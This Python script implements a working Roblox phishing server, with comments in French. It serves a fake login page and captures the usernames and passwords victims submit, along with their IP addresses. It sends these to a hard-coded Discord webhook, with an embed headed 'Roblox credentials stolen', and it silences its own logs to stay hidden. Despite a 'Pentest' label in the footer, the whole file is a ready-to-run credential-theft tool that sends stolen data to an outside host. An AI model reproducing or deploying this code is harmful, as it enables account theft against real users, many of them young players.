#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import socket
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler

WEBHOOK_URL = "https://discord.com/api/webhooks/1399773754128601098/pdyLl7G9sLqosolQ1F1uRqM5Z1p2ojed7j4BrUVJ9AhSfC0dP9ld42YyoutGvxRHw1xo"
PORT = 8080

class RobloxPhishHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # Trouver le chemin du HTML (que ce soit en dev ou dans l'exe compilé)
            if getattr(sys, 'frozen', False):
                # Mode exe compilé avec PyInstaller
                base_path = sys._MEIPASS
            else:
                # Mode script Python normal
                base_path = os.path.dirname(os.path.abspath(__file__))
            
            html_path = os.path.join(base_path, 'index.html')
            
            if os.path.exists(html_path):
                with open(html_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                error_msg = f"<h1>Erreur: index.html introuvable</h1><p>Chemin cherché: {html_path}</p>"
                self.wfile.write(error_msg.encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(body)
                username = data.get('username', 'Inconnu')
                password = data.get('password', 'Inconnu')
                
                # Récupérer l'IP du client
                client_ip = self.client_address[0]
                
                # Essayer de récupérer le vrai nom d'hôte si reverse proxy
                forwarded = self.headers.get('X-Forwarded-For', '')
                if forwarded:
                    client_ip = forwarded.split(',')[0].strip()
                
                # Envoyer sur Discord
                self.send_to_discord(username, password, client_ip)
                
                # Répondre "succès" pour rediriger vers la vraie page Roblox
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"success": True}).encode())
                
            except Exception as e:
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        # Supprimer les logs du serveur pour rester discret
        pass
    
    def send_to_discord(self, username, password, ip):
        embed = {
            "title": "🔴 Identifiants Roblox volés",
            "color": 0xFF0000,
            "fields": [
                {"name": "👤 Email / Username", "value": username, "inline": True},
                {"name": "🔑 Mot de passe", "value": password, "inline": True},
                {"name": "🌐 IP", "value": ip, "inline": True},
                {"name": "🕐 Timestamp", "value": __import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False},
            ],
            "footer": {"text": "Roblox Phish - Pentest"}
        }
        
        try:
            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
            # Envoyer aussi un message texte pour notification
            requests.post(WEBHOOK_URL, json={"content": f"🚨 **Nouveau login** | {username} | {password} | IP: {ip}"}, timeout=10)
        except:
            pass


def get_local_ip():
    """Récupère l'IP locale de la machine"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def start_server():
    """Démarre le serveur HTTP"""
    server = HTTPServer(('0.0.0.0', PORT), RobloxPhishHandler)
    print(f"[+] Serveur démarré sur http://0.0.0.0:{PORT}")
    print(f"[+] IP locale: http://{get_local_ip()}:{PORT}")
    print(f"[+] En attente de connexions...")
    print("[+] Appuie sur Ctrl+C pour arrêter")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Serveur arrêté")
        server.server_close()


if __name__ == "__main__":
    start_server()